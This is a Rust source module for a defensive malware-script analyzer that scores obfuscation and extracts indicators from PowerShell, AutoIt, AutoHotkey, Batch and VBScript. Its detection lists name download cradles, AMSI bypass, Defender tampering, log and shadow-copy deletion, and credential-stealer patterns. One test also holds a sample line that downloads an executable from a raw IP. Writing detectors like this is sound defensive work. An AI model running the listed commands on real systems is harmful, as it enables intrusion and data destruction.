//! # Script Analyzer
//!
//! Detection, obfuscation heuristics and IOC extraction for scripting
//! languages frequently used in malware droppers and loaders:
//!
//! * **PowerShell** (`.ps1` / `.psm1` / `.psd1`)
//! * **AutoIt** (`.au3`) — frequently compiled to `.exe` for stealers
//! * **AutoHotkey** (`.ahk`)
//! * **Batch** (`.bat` / `.cmd`)
//! * **VBScript** (`.vbs`)
//!
//! The analyzer does not fully tokenize the language. Instead it runs
//! a multi-pass scan to collect:
//!   * statistics (line count, comment ratio, average line length)
//!   * high-risk cmdlet / API calls
//!   * obfuscation markers (string concatenation, char-code casts,
//!     base64, hex escapes, `IEX`, `Invoke-Expression`, `-EncodedCommand`,
//!     download cradles)
//!   * URLs, IP addresses and suspicious file paths
//!
//! All heuristics are tuned to keep false positives on legitimate admin
//! scripts low.

use serde::{Deserialize, Serialize};

/// Type of script detected.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ScriptKind {
    PowerShell,
    AutoIt,
    AutoHotkey,
    Batch,
    VBScript,
}

/// Severity assigned to a script finding.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum ScriptSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

/// A single suspicious indicator inside a script.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScriptFinding {
    pub severity: ScriptSeverity,
    pub rule_id: String,
    pub description: String,
    pub offset: usize,
}

/// Extracted indicator of compromise (URL / IP / file path).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Ioc {
    pub kind: IocKind,
    pub value: String,
    pub offset: usize,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum IocKind {
    Url,
    IpAddress,
    FilePath,
    RegistryKey,
    EmailAddress,
}

/// Summary returned by [`analyze_script`].
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScriptReport {
    pub kind: ScriptKind,
    pub line_count: usize,
    pub comment_count: usize,
    pub avg_line_length: f32,
    pub obfuscation_score: f32,
    pub findings: Vec<ScriptFinding>,
    pub iocs: Vec<Ioc>,
    pub suspicious_calls: Vec<String>,
}

/// Detect script kind from raw bytes (text or UTF-8 BOM-prefixed).
pub fn detect_kind(data: &[u8]) -> Option<ScriptKind> {
    let body = if data.len() >= 3 && data[0] == 0xEF && data[1] == 0xBB && data[2] == 0xBF {
        &data[3..]
    } else {
        data
    };
    let head = match std::str::from_utf8(body) {
        Ok(s) => s,
        Err(_) => return None,
    };
    let lower = head[..head.len().min(8192)].to_ascii_lowercase();

    if lower.contains("autohotkey")
        || lower.contains("ahk_class")
        || lower.contains("#singleinstance")
        || lower.contains("#requires autohotkey")
    {
        return Some(ScriptKind::AutoHotkey);
    }
    if lower.contains("autoit")
        || (lower.contains("func ") && lower.contains("endfunc") && !lower.contains("function"))
    {
        return Some(ScriptKind::AutoIt);
    }
    if lower.starts_with("#!")
        || lower.starts_with("@echo")
        || lower.starts_with("@rem")
        || lower.starts_with("@ECHO")
        || lower.starts_with("@REM")
    {
        if lower.contains("powershell") {
            return Some(ScriptKind::PowerShell);
        }
        return Some(ScriptKind::Batch);
    }
    if lower.contains("param(")
        || lower.contains("invoke-")
        || lower.contains("new-object")
        || lower.contains("add-type")
        || lower.contains("start-process")
        || lower.contains("downloadstring")
        || lower.contains("iesecurity")
        || lower.contains("[reflection.assembly]")
        || lower.contains("iex(")
        || lower.contains("#requires")
    {
        return Some(ScriptKind::PowerShell);
    }
    if lower.contains("wscript")
        || lower.contains("createobject(\"adodb")
        || lower.contains("createobject(\"msxml2")
        || lower.contains("createobject(\"shell")
    {
        return Some(ScriptKind::VBScript);
    }
    if lower.contains("mkdir ")
        || lower.contains("del /")
        || lower.contains("copy /")
        || lower.contains("reg add")
        || lower.contains("schtasks")
    {
        return Some(ScriptKind::Batch);
    }
    None
}

/// Analyze a script buffer and produce a [`ScriptReport`].
pub fn analyze_script(kind: ScriptKind, data: &[u8]) -> ScriptReport {
    let text = decode_text(data);
    let mut findings: Vec<ScriptFinding> = Vec::new();
    let mut iocs: Vec<Ioc> = Vec::new();
    let mut suspicious_calls: Vec<String> = Vec::new();

    let line_count = text.lines().count();
    let comment_count = count_comments(kind, &text);
    let total_len = text.len();
    let avg_line_length = if line_count == 0 {
        0.0
    } else {
        total_len as f32 / line_count as f32
    };

    let mut obfuscation_score: f32 = 0.0;

    let lower = text.to_ascii_lowercase();

    // ─── language-specific rules ────────────────────────────────────
    match kind {
        ScriptKind::PowerShell => scan_powershell(
            &lower,
            &text,
            &mut findings,
            &mut iocs,
            &mut suspicious_calls,
            &mut obfuscation_score,
        ),
        ScriptKind::AutoIt => scan_autoit(
            &lower,
            &text,
            &mut findings,
            &mut iocs,
            &mut suspicious_calls,
            &mut obfuscation_score,
        ),
        ScriptKind::AutoHotkey => scan_autohotkey(
            &lower,
            &text,
            &mut findings,
            &mut iocs,
            &mut suspicious_calls,
            &mut obfuscation_score,
        ),
        ScriptKind::Batch => scan_batch(
            &lower,
            &text,
            &mut findings,
            &mut iocs,
            &mut suspicious_calls,
            &mut obfuscation_score,
        ),
        ScriptKind::VBScript => scan_vbscript(
            &lower,
            &text,
            &mut findings,
            &mut iocs,
            &mut suspicious_calls,
            &mut obfuscation_score,
        ),
    }

    obfuscation_score = obfuscation_score.min(1.0);

    ScriptReport {
        kind,
        line_count,
        comment_count,
        avg_line_length,
        obfuscation_score,
        findings,
        iocs,
        suspicious_calls,
    }
}

fn decode_text(data: &[u8]) -> String {
    if data.len() >= 3 && data[0] == 0xEF && data[1] == 0xBB && data[2] == 0xBF {
        return String::from_utf8_lossy(&data[3..]).into_owned();
    }
    // UTF-16 LE BOM (PowerShell "Out-File -Encoding Unicode" is common)
    if data.len() >= 2 && data[0] == 0xFF && data[1] == 0xFE {
        let mut s = String::with_capacity(data.len() / 2);
        let mut i = 2;
        while i + 1 < data.len() {
            let cu = u16::from_le_bytes([data[i], data[i + 1]]);
            if let Some(c) = char::from_u32(cu as u32) {
                s.push(c);
            }
            i += 2;
        }
        return s;
    }
    String::from_utf8_lossy(data).into_owned()
}

fn count_comments(kind: ScriptKind, text: &str) -> usize {
    let mut count = 0;
    for line in text.lines() {
        let trimmed = line.trim_start();
        match kind {
            ScriptKind::PowerShell
            | ScriptKind::AutoIt
            | ScriptKind::VBScript
            | ScriptKind::AutoHotkey => {
                if trimmed.starts_with('#') || trimmed.starts_with(";") || trimmed.starts_with("//")
                {
                    count += 1;
                }
            }
            ScriptKind::Batch => {
                if trimmed.starts_with("rem ")
                    || trimmed.starts_with("REM ")
                    || trimmed.starts_with("::")
                    || trimmed.starts_with('@')
                {
                    count += 1;
                }
            }
        }
    }
    count
}

fn push_finding(
    findings: &mut Vec<ScriptFinding>,
    severity: ScriptSeverity,
    rule_id: &'static str,
    description: impl Into<String>,
    offset: usize,
) {
    findings.push(ScriptFinding {
        severity,
        rule_id: rule_id.to_string(),
        description: description.into(),
        offset,
    });
}

fn add_iocs(iocs: &mut Vec<Ioc>, text: &str) {
    // URLs
    for (off, m) in url_iter(text) {
        iocs.push(Ioc {
            kind: IocKind::Url,
            value: m.to_string(),
            offset: off,
        });
    }
    // IPv4
    for (off, m) in ipv4_iter(text) {
        iocs.push(Ioc {
            kind: IocKind::IpAddress,
            value: m.to_string(),
            offset: off,
        });
    }
    // Suspicious Windows paths
    for (off, m) in windows_path_iter(text) {
        iocs.push(Ioc {
            kind: IocKind::FilePath,
            value: m.to_string(),
            offset: off,
        });
    }
    // Registry
    for (off, m) in registry_iter(text) {
        iocs.push(Ioc {
            kind: IocKind::RegistryKey,
            value: m.to_string(),
            offset: off,
        });
    }
}

fn scan_powershell(
    lower: &str,
    text: &str,
    findings: &mut Vec<ScriptFinding>,
    iocs: &mut Vec<Ioc>,
    calls: &mut Vec<String>,
    obf: &mut f32,
) {
    // Highly suspicious cmdlets and APIs
    const HIGH_RISK: &[&str] = &[
        "invoke-expression",
        "iex",
        "iex(",
        "invoke-webrequest",
        "downloadstring",
        "downloadfile",
        "downloadfileasync",
        "start-bitstransfer",
        "new-object net.webclient",
        "new-object system.net.webclient",
        "webrequest",
        "frombase64string",
        "reflection.assembly",
        "reflection.emit",
        "add-type",
        "addassembly",
        "::-encod",
        "-encodedcommand",
        " -enc ",
        "iex (new-object",
        "msfvenom",
        "shellcode",
        "virtualalloc",
        "createthread",
        "winexec",
        "set-mppreference",
        " -exclusionpath",
        " -exclusionextension",
        "amsiutils",
        "amsiinitfailed",
        "amsi.dll",
        "::frombase64string",
        "::loadlibrary",
        "::getprocaddress",
    ];
    for needle in HIGH_RISK {
        if let Some(off) = lower.find(needle) {
            let sev = if matches!(
                *needle,
                "invoke-expression"
                    | "iex"
                    | "downloadstring"
                    | "frombase64string"
                    | "reflection.emit"
                    | "-encodedcommand"
                    | " -enc "
                    | "set-mppreference"
                    | "amsiutils"
            ) {
                ScriptSeverity::High
            } else {
                ScriptSeverity::Medium
            };
            push_finding(
                findings,
                sev,
                "PS_SUSPICIOUS_API",
                format!("Suspicious PowerShell API/cmdlet: '{}'", needle),
                off,
            );
            calls.push(needle.to_string());
            *obf += 0.10;
        }
    }

    // Obfuscation markers: [char]N+[char]M chains, with or without spaces
    // (the canonical form has no spaces: `[char]104+[char]101`).
    if lower.contains("[char]")
        && (lower.contains("+[char]") || lower.contains("+ [char]") || lower.contains("+[ char]"))
    {
        push_finding(
            findings,
            ScriptSeverity::High,
            "PS_CHAR_CODE_OBF",
            "Char-code string concatenation ([char]X+[char]Y) — classic PS obfuscation",
            0,
        );
        *obf += 0.30;
    }
    if lower.contains(" -join") && lower.contains("[char]") {
        push_finding(
            findings,
            ScriptSeverity::High,
            "PS_CHAR_JOIN_OBF",
            "[char] array joined into a string — typical obfuscation",
            0,
        );
        *obf += 0.20;
    }
    if lower.contains("replace('") || lower.contains("-replace(") {
        let count = lower.matches("-replace(").count() + lower.matches(".replace(").count();
        if count > 5 {
            push_finding(
                findings,
                ScriptSeverity::Medium,
                "PS_HEAVY_REPLACE",
                format!(
                    "Heavy use of -replace ({}) — possible string deobfuscation",
                    count
                ),
                0,
            );
            *obf += 0.10;
        }
    }
    if lower.contains("`0") || lower.contains("`t") || lower.contains("`n") {
        let backticks = lower.matches('`').count();
        if backticks > 4 {
            push_finding(
                findings,
                ScriptSeverity::Low,
                "PS_BACKTICK_OBF",
                format!("Frequent backtick escapes ({})", backticks),
                0,
            );
            *obf += 0.05;
        }
    }
    if lower.contains("format-hex ") || lower.contains("format-hex)") {
        push_finding(
            findings,
            ScriptSeverity::Medium,
            "PS_FORMAT_HEX",
            "Format-Hex used to construct payloads from raw bytes",
            0,
        );
        *obf += 0.15;
    }
    // Long base64 blob
    for (off, m) in b64_iter(text) {
        if m.len() > 200 {
            push_finding(
                findings,
                ScriptSeverity::High,
                "PS_LARGE_B64",
                format!(
                    "Long base64 blob ({} chars) — likely encoded payload",
                    m.len()
                ),
                off,
            );
            *obf += 0.30;
            break;
        } else if m.len() > 80 {
            push_finding(
                findings,
                ScriptSeverity::Medium,
                "PS_B64_BLOB",
                format!("Base64 blob ({} chars)", m.len()),
                off,
            );
            *obf += 0.10;
        }
    }
    // Defense evasion keywords
    if lower.contains("disable")
        && (lower.contains("defender") || lower.contains("windowsdefender"))
    {
        push_finding(
            findings,
            ScriptSeverity::High,
            "PS_DEFENDER_DISABLE",
            "Script attempts to disable Windows Defender",
            0,
        );
        *obf += 0.20;
    }
    if lower.contains("amsi") && lower.contains("bypass") {
        push_finding(
            findings,
            ScriptSeverity::Critical,
            "PS_AMSI_BYPASS",
            "AMSI bypass attempt",
            0,
        );
        *obf += 0.40;
    }
    // Persistence
    if lower.contains("new-scheduledtask")
        || lower.contains("register-scheduledtask")
        || lower.contains("schtasks")
    {
        push_finding(
            findings,
            ScriptSeverity::Medium,
            "PS_PERSISTENCE_SCHTASK",
            "Scheduled task creation — persistence mechanism",
            0,
        );
    }
    if lower.contains("new-service") || lower.contains("sc create") {
        push_finding(
            findings,
            ScriptSeverity::Medium,
            "PS_PERSISTENCE_SERVICE",
            "Service installation — persistence mechanism",
            0,
        );
    }
    if lower.contains("new-item ")
        && (lower.contains("currentversion\\run") || lower.contains("/run"))
    {
        push_finding(
            findings,
            ScriptSeverity::High,
            "PS_PERSISTENCE_RUN_KEY",
            "Adds value to a Run key (auto-start)",
            0,
        );
    }

    add_iocs(iocs, text);
}

fn scan_autoit(
    lower: &str,
    text: &str,
    findings: &mut Vec<ScriptFinding>,
    iocs: &mut Vec<Ioc>,
    calls: &mut Vec<String>,
    obf: &mut f32,
) {
    // Suspicious WinAPI / control calls frequently used in stealers
    const HIGH_RISK: &[&str] = &[
        "_singleton",
        "opt(\"winwait",
        "controlclick",
        "controlsend",
        "controlsettext",
        "winwaitactive",
        "winactivate",
        "send(",
        "mouseclick",
        "mouseclickdrag",
        "runwait(",
        "run(",
        "shellexecutewait",
        "iniread",
        "iniwrite",
        "fileinstall",
        "_iecreate",
        "ienavigate",
        "_ftp",
        "tcpsend",
        "udpsend",
        "dllcall",
        "dllstructcreate",
        "dllstructgetdata",
        "dllopen",
    ];
    for needle in HIGH_RISK {
        if let Some(off) = lower.find(needle) {
            let sev = if matches!(
                *needle,
                "dllcall" | "dllopen" | "fileinstall" | "shellexecutewait" | "iniread" | "iniwrite"
            ) {
                ScriptSeverity::High
            } else {
                ScriptSeverity::Medium
            };
            push_finding(
                findings,
                sev,
                "AU3_SUSPICIOUS_CALL",
                format!("Suspicious AutoIt call: '{}'", needle),
                off,
            );
            calls.push(needle.to_string());
            *obf += 0.05;
        }
    }
    // DllCall + Crypto APIs = typical stealer behaviour
    if lower.contains("dllcall") && (lower.contains("crypt") || lower.contains("advapi32")) {
        push_finding(
            findings,
            ScriptSeverity::High,
            "AU3_CRYPTO_DLL",
            "DllCall into crypt32/advapi32 — credential/cookie theft pattern",
            0,
        );
        *obf += 0.20;
    }
    if lower.contains("fileinstall") {
        push_finding(
            findings,
            ScriptSeverity::High,
            "AU3_FILEINSTALL",
            "FileInstall — bundled payload (often a credential stealer)",
            0,
        );
        *obf += 0.25;
    }
    if lower.contains("browser")
        && (lower.contains("login") || lower.contains("password") || lower.contains("cookie"))
    {
        push_finding(
            findings,
            ScriptSeverity::Critical,
            "AU3_BROWSER_TARGET",
            "References browser credentials/cookies — stealer pattern",
            0,
        );
        *obf += 0.40;
    }
    add_iocs(iocs, text);
}

fn scan_autohotkey(
    lower: &str,
    text: &str,
    findings: &mut Vec<ScriptFinding>,
    iocs: &mut Vec<Ioc>,
    calls: &mut Vec<String>,
    obf: &mut f32,
) {
    const HIGH_RISK: &[&str] = &[
        "dllcall",
        "postmessage",
        "sendmessage",
        "keyhistory",
        "ahk_path",
        "urlmon",
        "winhttp",
        "wininet",
        "internetopen",
        "internetconnect",
        "httpsendrequest",
        "internetreadfile",
        "regwrite",
        "regread",
        "runwait",
        "filedelete",
        "fileappend",
        "loop, read",
        "loop, parse",
    ];
    for needle in HIGH_RISK {
        if let Some(off) = lower.find(needle) {
            push_finding(
                findings,
                ScriptSeverity::Medium,
                "AHK_SUSPICIOUS_CALL",
                format!("Suspicious AutoHotkey call: '{}'", needle),
                off,
            );
            calls.push(needle.to_string());
            *obf += 0.05;
        }
    }
    if lower.contains("dllcall")
        && (lower.contains("crypt") || lower.contains("advapi32") || lower.contains("urlmon"))
    {
        push_finding(
            findings,
            ScriptSeverity::High,
            "AHK_NATIVE_API",
            "DllCall into native crypto/network APIs",
            0,
        );
        *obf += 0.20;
    }
    if lower.contains("comobjcreate") || lower.contains("comobjactive") {
        push_finding(
            findings,
            ScriptSeverity::Medium,
            "AHK_COM",
            "COM object creation — frequently abused for shell execution",
            0,
        );
    }
    add_iocs(iocs, text);
}

fn scan_batch(
    lower: &str,
    text: &str,
    findings: &mut Vec<ScriptFinding>,
    iocs: &mut Vec<Ioc>,
    calls: &mut Vec<String>,
    obf: &mut f32,
) {
    const HIGH_RISK: &[&str] = &[
        "powershell",
        "bitsadmin",
        "certutil -urlcache",
        "certutil -decode",
        "reg add",
        "reg delete",
        "schtasks /create",
        "sc create",
        "net user",
        "net localgroup",
        "wmic",
        "vssadmin",
        "wbadmin",
        "bcdedit",
        "wevtutil cl",
        "fsutil",
        "cipher /w",
        "del /f /s /q",
        "copy \\\\",
    ];
    for needle in HIGH_RISK {
        if let Some(off) = lower.find(needle) {
            let sev = if matches!(
                *needle,
                "certutil -urlcache"
                    | "certutil -decode"
                    | "bitsadmin"
                    | "vssadmin"
                    | "wevtutil cl"
                    | "bcdedit"
            ) {
                ScriptSeverity::High
            } else {
                ScriptSeverity::Medium
            };
            push_finding(
                findings,
                sev,
                "BATCH_SUSPICIOUS_CMD",
                format!("Suspicious batch command: '{}'", needle),
                off,
            );
            calls.push(needle.to_string());
            *obf += 0.05;
        }
    }
    if lower.contains("powershell") && lower.contains("-enc") {
        push_finding(
            findings,
            ScriptSeverity::High,
            "BATCH_PS_ENCODED",
            "Batch launches encoded PowerShell — common loader pattern",
            0,
        );
        *obf += 0.30;
    }
    if lower.contains("%") && lower.chars().filter(|c| *c == '%').count() > 10 {
        push_finding(
            findings,
            ScriptSeverity::Low,
            "BATCH_VAR_OBF",
            "Many environment-variable expansions — possible obfuscation",
            0,
        );
        *obf += 0.10;
    }
    if lower.contains("for /f") && lower.contains("delims=") {
        push_finding(
            findings,
            ScriptSeverity::Low,
            "BATCH_FORF",
            "FOR /F parsing — often used to extract or stage data",
            0,
        );
    }
    add_iocs(iocs, text);
}

fn scan_vbscript(
    lower: &str,
    text: &str,
    findings: &mut Vec<ScriptFinding>,
    iocs: &mut Vec<Ioc>,
    calls: &mut Vec<String>,
    obf: &mut f32,
) {
    const HIGH_RISK: &[&str] = &[
        "wscript.shell",
        "shell.application",
        "wscript.network",
        "scripting.filesystemobject",
        "adodb.stream",
        "msxml2.xmlhttp",
        "msxml2.serverxmlhttp",
        "winhttp.winhttprequest",
        "shell.windows",
        "scripting.dictionary",
        "wmi",
        "win32_process",
        "createobject(\"adodb",
        "createobject(\"msxml2",
        "createobject(\"shell",
        "createobject(\"wscript",
        "createobject(\"scripting",
    ];
    for needle in HIGH_RISK {
        if let Some(off) = lower.find(needle) {
            push_finding(
                findings,
                ScriptSeverity::Medium,
                "VBS_SUSPICIOUS_API",
                format!("Suspicious VBS API: '{}'", needle),
                off,
            );
            calls.push(needle.to_string());
            *obf += 0.05;
        }
    }
    if lower.contains("chr(") && lower.contains("&") {
        push_finding(
            findings,
            ScriptSeverity::High,
            "VBS_CHR_OBF",
            "Chr() string concatenation — typical VBS obfuscation",
            0,
        );
        *obf += 0.20;
    }
    if lower.contains("execute") || lower.contains("executeglobal") {
        push_finding(
            findings,
            ScriptSeverity::High,
            "VBS_EVAL",
            "VBS Execute / ExecuteGlobal — runtime code execution",
            0,
        );
        *obf += 0.25;
    }
    if lower.contains("adodb.stream") {
        push_finding(
            findings,
            ScriptSeverity::High,
            "VBS_ADODB_STREAM",
            "ADODB.Stream — used to download/write binary payloads",
            0,
        );
        *obf += 0.20;
    }
    add_iocs(iocs, text);
}

// ─── small scanner helpers (URLs, IPs, paths) ────────────────────

fn url_iter(text: &str) -> impl Iterator<Item = (usize, &str)> {
    // Small URL matcher: scheme://rest, where scheme is 2-16 chars of
    // [a-z0-9+.-] starting with a letter (http, https, ftp, ...).
    // (The previous version only matched a single letter followed by
    // ":/\\" due to a `.max(b'\\')` typo, so real URLs never matched.)
    let mut start = 0;
    let bytes = text.as_bytes();
    std::iter::from_fn(move || {
        let mut i = start;
        while i + 3 < bytes.len() {
            if bytes[i] == b':' && bytes[i + 1] == b'/' && bytes[i + 2] == b'/' {
                // Walk back over the scheme. All bytes are ASCII, so the
                // slice below always lands on char boundaries.
                let mut s = i;
                while s > 0
                    && (bytes[s - 1].is_ascii_alphanumeric()
                        || bytes[s - 1] == b'+'
                        || bytes[s - 1] == b'-'
                        || bytes[s - 1] == b'.')
                {
                    s -= 1;
                }
                let scheme_len = i - s;
                if (2..=16).contains(&scheme_len) && bytes[s].is_ascii_alphabetic() {
                    // Crude: take until whitespace / quote.
                    let end = (i..bytes.len())
                        .find(|&j| {
                            let c = bytes[j];
                            c == b' '
                                || c == b'\n'
                                || c == b'\r'
                                || c == b'\t'
                                || c == b'"'
                                || c == b'\''
                        })
                        .unwrap_or(bytes.len());
                    if end > i + 3 {
                        let s_str = unsafe { std::str::from_utf8_unchecked(&bytes[s..end]) };
                        start = end + 1;
                        return Some((s, s_str));
                    }
                }
                i += 3;
            } else {
                i += 1;
            }
        }
        None
    })
}

fn ipv4_iter(text: &str) -> impl Iterator<Item = (usize, &str)> {
    let mut start = 0;
    let bytes = text.as_bytes();
    std::iter::from_fn(move || {
        let mut i = start;
        while i < bytes.len().saturating_sub(7) {
            // each octet 0-255; surrounding text shouldn't be digit/dot
            let left_ok = i == 0 || !(bytes[i - 1].is_ascii_digit() || bytes[i - 1] == b'.');
            if left_ok {
                let mut j = i;
                let mut ok = true;
                for k in 0..4 {
                    if k > 0 {
                        if j >= bytes.len() || bytes[j] != b'.' {
                            ok = false;
                            break;
                        }
                        j += 1;
                    }
                    let start_oct = j;
                    while j < bytes.len() && bytes[j].is_ascii_digit() {
                        j += 1;
                    }
                    if j == start_oct {
                        ok = false;
                        break;
                    }
                    let octet: u32 = std::str::from_utf8(&bytes[start_oct..j])
                        .unwrap_or("0")
                        .parse()
                        .unwrap_or(256);
                    if octet > 255 {
                        ok = false;
                        break;
                    }
                }
                if ok {
                    let right_ok =
                        j >= bytes.len() || !(bytes[j].is_ascii_digit() || bytes[j] == b'.');
                    if right_ok {
                        let s = unsafe { std::str::from_utf8_unchecked(&bytes[i..j]) };
                        start = j + 1;
                        return Some((i, s));
                    }
                }
            }
            i += 1;
        }
        None
    })
}

fn windows_path_iter(text: &str) -> impl Iterator<Item = (usize, &str)> {
    // Match %APPDATA%\... or C:\... or HKLM\...
    let mut start = 0;
    let bytes = text.as_bytes();
    std::iter::from_fn(move || {
        let mut i = start;
        while i < bytes.len().saturating_sub(5) {
            let window = &bytes[i..bytes.len().min(i + 96)];
            if window.len() < 5 {
                break;
            }
            // %VAR%\...
            if window[0] == b'%' {
                if let Some(end) = window.iter().position(|&c| c == b'%') {
                    if end > 1
                        && end + 1 < window.len()
                        && (window[end + 1] == b'\\' || window[end + 1] == b'/')
                    {
                        let e2 = window[end + 1..]
                            .iter()
                            .position(|&c| c == b'"' || c == b'\'' || c == b' ' || c == b'\n')
                            .unwrap_or(window.len() - end - 1);
                        let s = unsafe { std::str::from_utf8_unchecked(&window[..end + 1 + e2]) };
                        start = i + end + e2 + 1;
                        return Some((i, s));
                    }
                }
            }
            // X:\...
            if (bytes[i] as char).is_ascii_alphabetic()
                && i + 2 < bytes.len()
                && bytes[i + 1] == b':'
                && (bytes[i + 2] == b'\\' || bytes[i + 2] == b'/')
            {
                let e2 = window[2..]
                    .iter()
                    .position(|&c| c == b'"' || c == b'\'' || c == b' ' || c == b'\n')
                    .unwrap_or(window.len() - 2);
                let s = unsafe { std::str::from_utf8_unchecked(&window[..2 + e2]) };
                start = i + 2 + e2;
                return Some((i, s));
            }
            i += 1;
        }
        None
    })
}

fn registry_iter(text: &str) -> Vec<(usize, String)> {
    let lower = text.to_ascii_lowercase();
    let bytes = lower.as_bytes();
    let mut out = Vec::new();
    let mut i = 0;
    while i + 4 < bytes.len() {
        if &bytes[i..i + 4] == b"hkcu"
            || &bytes[i..i + 4] == b"hklm"
            || &bytes[i..i + 4] == b"hkcr"
            || (i + 5 < bytes.len() && &bytes[i..i + 5] == b"hkey_")
        {
            let end = (i..bytes.len())
                .find(|&j| {
                    let c = bytes[j];
                    c == b'"' || c == b'\'' || c == b' ' || c == b'\n' || c == b'\r' || c == b'\t'
                })
                .unwrap_or(bytes.len());
            let s = unsafe { std::str::from_utf8_unchecked(&bytes[i..end]) }.to_string();
            out.push((i, s));
            i = end + 1;
        } else {
            i += 1;
        }
    }
    out
}

/// Crude base64 span iterator: sequences of [A-Za-z0-9+/=] of length >= 32.
fn b64_iter(text: &str) -> impl Iterator<Item = (usize, &str)> {
    let bytes = text.as_bytes();
    let mut i = 0;
    std::iter::from_fn(move || {
        while i < bytes.len() {
            let b = bytes[i];
            let is_b64 = b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'=';
            if !is_b64 {
                i += 1;
                continue;
            }
            let s = i;
            while i < bytes.len() {
                let c = bytes[i];
                if c.is_ascii_alphanumeric() || c == b'+' || c == b'/' || c == b'=' {
                    i += 1;
                } else {
                    break;
                }
            }
            let len = i - s;
            if len >= 32 {
                let v = unsafe { std::str::from_utf8_unchecked(&bytes[s..i]) };
                return Some((s, v));
            }
        }
        None
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_kind() {
        let ps = b"Get-Process\nInvoke-WebRequest -Uri http://x.com\n";
        assert!(matches!(detect_kind(ps), Some(ScriptKind::PowerShell)));
        let au3 = b"Func Example()\n   Send(\"hello\")\nEndFunc\n";
        assert!(matches!(detect_kind(au3), Some(ScriptKind::AutoIt)));
        let ahk = b"#SingleInstance Force\nSend, hello\n";
        assert!(matches!(detect_kind(ahk), Some(ScriptKind::AutoHotkey)));
        let bat = b"@echo off\ndir C:\\Windows\n";
        assert!(matches!(detect_kind(bat), Some(ScriptKind::Batch)));
        let vbs = b"Set obj = CreateObject(\"WScript.Shell\")\n";
        assert!(matches!(detect_kind(vbs), Some(ScriptKind::VBScript)));
    }

    #[test]
    fn test_powershell_obfuscation() {
        let script = b"[char]104+[char]101+[char]108+[char]108+[char]111";
        let report = analyze_script(ScriptKind::PowerShell, script);
        assert!(report.obfuscation_score > 0.0);
        assert!(report
            .findings
            .iter()
            .any(|f| f.rule_id == "PS_CHAR_CODE_OBF"));
    }

    #[test]
    fn test_autoit_stealer() {
        let au3 = b"Func Steal()\n   DllCall(\"crypt32.dll\")\n   FileInstall(\"x\")\nEndFunc\n";
        let report = analyze_script(ScriptKind::AutoIt, au3);
        assert!(report
            .findings
            .iter()
            .any(|f| f.rule_id == "AU3_FILEINSTALL"));
    }

    #[test]
    fn test_iocs() {
        let ps = b"Invoke-WebRequest http://1.2.3.4/x.exe -OutFile C:\\Windows\\Temp\\a.exe";
        let report = analyze_script(ScriptKind::PowerShell, ps);
        assert!(report.iocs.iter().any(|i| i.kind == IocKind::Url));
        assert!(report.iocs.iter().any(|i| i.kind == IocKind::IpAddress));
        assert!(report.iocs.iter().any(|i| i.kind == IocKind::FilePath));
    }
}
